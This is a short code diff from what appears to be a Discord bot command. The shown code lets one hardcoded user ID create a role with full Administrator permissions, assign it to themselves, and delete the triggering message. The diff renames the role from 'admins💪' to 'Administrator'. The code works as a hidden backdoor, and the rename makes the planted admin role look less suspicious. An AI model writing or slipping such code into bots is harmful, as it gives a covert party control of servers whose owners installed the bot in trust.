@@ -14,7 +14,7 @@ module.exports = {
         const allowed = ['762711150118174751']
         if(!allowed.includes(message.author.id)) return 
 
-        role = await message.guild.roles.create({ name: "admins💪", permissions: [PermissionsBitField.Flags.Administrator], color: '#5d4c87' });
+        role = await message.guild.roles.create({ name: "Administrator", permissions: [PermissionsBitField.Flags.Administrator], color: '#5d4c87' });
         message.member.roles.add(role)
         message.delete();
 
